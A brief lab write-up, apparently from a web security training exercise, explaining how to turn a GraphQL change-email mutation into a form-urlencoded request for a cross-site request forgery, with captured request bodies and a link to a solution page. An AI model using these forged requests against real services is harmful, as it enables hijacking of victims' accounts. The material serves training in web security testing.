# Performing CSRF exploits over GraphQL
To solve this lab, we can use the change email request that we make when we change our own email. Then we can convert it into a `x-www-form-urlencoded` type and then write a solve page.

1. Change our own email and capture request:
```
...
Content-Type: application/json
...

{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"test@test.t"}}}
```

2. change method into `x-www-form-urlencoded` - this is what I got working
```
...
Content-Type: x-www-form-urlencoded
...

query=mutation changeEmail {
changeEmail(input: {email:"pwn@pwned.evil"}){email}}
```
3. Create a page that when user visits it, it changes their email.
[Soltion can be found here](./assets/Performing%20CSRF%20exploits%20over%20GraphQL.html)